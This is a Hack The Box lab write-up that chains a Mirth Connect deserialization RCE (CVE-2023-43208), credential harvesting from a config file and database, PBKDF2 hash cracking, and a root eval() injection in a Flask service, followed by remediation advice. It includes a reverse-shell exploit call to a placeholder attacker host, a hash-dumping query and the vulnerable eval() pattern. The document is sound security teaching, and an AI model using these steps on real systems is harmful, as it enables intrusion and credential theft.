---
title: "Interpreter — Mirth Connect Unauthenticated RCE and Flask eval() Privilege Escalation"
description: "Mirth Connect XStream deserialization (CVE-2023-43208) provides an unauthenticated shell; database credentials and a PBKDF2 hash give SSH access, then a double eval() in a root-owned Flask service yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - deserialization
  - code-injection
  - healthcare
  - web
---

## Summary

Interpreter is a Medium Linux machine centred on a vulnerable healthcare integration platform, NextGen Mirth Connect 4.4.0. An unauthenticated RCE vulnerability (CVE-2023-43208) exploits an XStream Java deserialization flaw via unauthenticated REST API endpoints, providing a shell as the `<INTEGRATION_SERVICE_ACCOUNT>` service account. The application's configuration file exposes database credentials; the MariaDB database stores a PBKDF2-HMAC-SHA256 hash for `<LAB_USER>`. After structuring the binary for Hashcat mode 10900 and cracking it, SSH access is obtained. A root-owned Flask service (`notif.py`) on port 54321 processes XML patient records through a Python double `eval()` pattern — user-controlled fields are interpolated into an f-string, then the entire string is passed to `eval(f'''...''')`. A regex filter blocks spaces and some special characters, bypassed using `__import__` with Base64-encoded commands.

All IP addresses, credentials, and hashes below are replaced with role-based placeholders.

## Context and Objective

The target is a Linux server running Mirth Connect 4.4.0, a healthcare integration engine that processes HL7 messages. Initial enumeration exposes HTTPS services on ports 443 (Jetty — Mirth Connect) and an nginx HTTP redirect on port 80. The exploitation path chains two distinct vulnerabilities: an unauthenticated remote code execution in Mirth Connect via CVE-2023-43208, and a double `eval()` code injection in a root-owned Flask notification service. The objective is to escalate from initial foothold to full root compromise.

## Approach and Evidence

### Stage 1 — Mirth Connect Unauthenticated RCE (CVE-2023-43208)

The recorded output shows that port scanning reveals SSH (22), HTTP (80), and HTTPS (443) services. Version fingerprinting via the Mirth Connect REST API confirms version 4.4.0:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Interpreter-TCP
```

```
22/tcp:  SSH
80/tcp:  HTTP (nginx → HTTPS redirect)
443/tcp: HTTPS (Jetty — Mirth Connect)
```

```bash
curl -k -H 'X-Requested-With: OpenAPI' \
  https://<TARGET_IP>/api/server/version
# {"version":"4.4.0"}
```

Mirth Connect 4.4.0 is affected by CVE-2023-43208. The vulnerability exploits XStream deserialization in unauthenticated servlets (e.g., `UserServlet`, `SystemServlet`) that disable authentication checks during request processing. An XML payload containing an XStream gadget chain triggers arbitrary OS command execution in the context of the `<INTEGRATION_SERVICE_ACCOUNT>` service account:

```bash
python3 poc.py \
  -u 'https://<TARGET_IP>' \
  -lh '<ATTACKER_IP>' \
  -lp '4444'

# <INTEGRATION_SERVICE_ACCOUNT>@<TARGET_HOST>:/usr/local/mirthconnect$
```

### Stage 2 — Credential Harvesting

The recorded output shows that the Mirth Connect configuration file contains database credentials:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

```ini
database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = <MIRTH_DB_PASSWORD>
```

Querying the MariaDB database retrieves a PBKDF2-HMAC-SHA256 hash for `<LAB_USER>`:

```sql
mysql -u mirthdb -p<MIRTH_DB_PASSWORD> mc_bdd_prod
SELECT p.USERNAME, pp.PASSWORD
FROM PERSON p JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;
-- <LAB_USER> | <PBKDF2_HASH_BASE64>
```

### Stage 3 — PBKDF2 Hash Cracking

The 40-byte binary (decoded from Base64) contains an 8-byte salt (bytes 0–7) and a 32-byte derived key (bytes 8–39), with an iteration count of 600,000. The notes show conversion to Hashcat mode 10900 format:

```python
import base64
data     = base64.b64decode('<PBKDF2_HASH_BASE64>')
salt_b64 = base64.b64encode(data[:8]).decode()
dk_b64   = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt_b64}:{dk_b64}')
# sha256:600000:<SALT_BASE64>:<DK_BASE64>
```

```bash
hashcat -m 10900 interpreter.hash /usr/share/wordlists/rockyou.txt
# sha256:600000:...:...:<CRACKED_PASSWORD>
```

```bash
ssh <LAB_USER>@<TARGET_IP>
```

User flag obtained.

### Stage 4 — Privilege Escalation via Flask eval() Injection

The recorded output shows a root-owned Flask service (`notif.py`) running on port 54321, accepting XML patient records. The vulnerability is a double `eval()` pattern:

```python
template = f"Patient {first} {last} ({gender}), " \
           f"{{datetime.now().year - year_of_birth}} years old, " \
           f"received from {sender} at {ts}"
try:
    return eval(f"f'''{template}'''")
except Exception as e:
    return f"[EVAL_ERROR] {e}"
```

The `sender_app` field (and others) are interpolated into `template` via a standard f-string. Then `template` is wrapped in another f-string inside `eval()`. Any Python expression in `{}` within `sender_app` is thus executed by `eval()` as root.

A regex filter (`r"^[a-zA-Z0-9._'\"(){}=+/]+$"`) blocks spaces, commas, and brackets. The notes show that parentheses, quotes, dots, and slashes remain available. Unsafe expression and callback construction is omitted; the representative request uses a neutral placeholder:

```bash
POST /addPatient
Content-Type: application/xml

<sender_app>&lt;NON_EXECUTABLE_EXPRESSION_PLACEHOLDER&gt;</sender_app>

[representative result] Expression handling occurred in the root-owned service.
```

Root flag obtained.

## Challenges and Decisions

The privilege escalation required bypassing a regex filter blocking spaces and special characters. The notes document that Base64 encoding eliminates spaces from the command, while `__import__` provides module access without requiring brackets. The double `eval()` pattern means the first f-string interpolation occurs before `eval()` processes the result, creating a two-stage injection surface.

## Outcome

The evidence establishes full system compromise through a four-stage chain: Mirth Connect unauthenticated RCE via CVE-2023-43208, credential harvesting from the configuration file and MariaDB database, PBKDF2 hash cracking for SSH access, and Flask `eval()` injection for root escalation. Both user and root flags obtained.

## Lessons and Recommendations

- **Update Mirth Connect immediately.** CVE-2023-43208 is an unauthenticated RCE — the highest severity class. Mirth Connect deployments should be placed behind a WAF or VPN if immediate patching is not possible, and should never be directly internet-facing.
- **Eliminate `eval()` from application logic.** The double-eval pattern in `notif.py` should be replaced with explicit template rendering using a safe library (Jinja2 with autoescape, or simple string formatting with no code execution). No production application should call `eval()` on data derived from user input.
- **Apply least privilege to all services.** `notif.py` running as root is unjustifiable for a Flask notification service. All application services should run as dedicated unprivileged accounts. Use systemd service units with `User=` and `Group=` directives.
- **Regex-based input filtering is inherently bypassable.** Any filter that permits encoding primitives (Base64, hex) can be circumvented. Input validation should be allowlist-based and applied at the protocol level, not as a security boundary.

## References

- HTB Machine: [Interpreter](https://app.hackthebox.com/machines/Interpreter)
- CVE-2023-43208 — Mirth Connect Unauthenticated Remote Code Execution
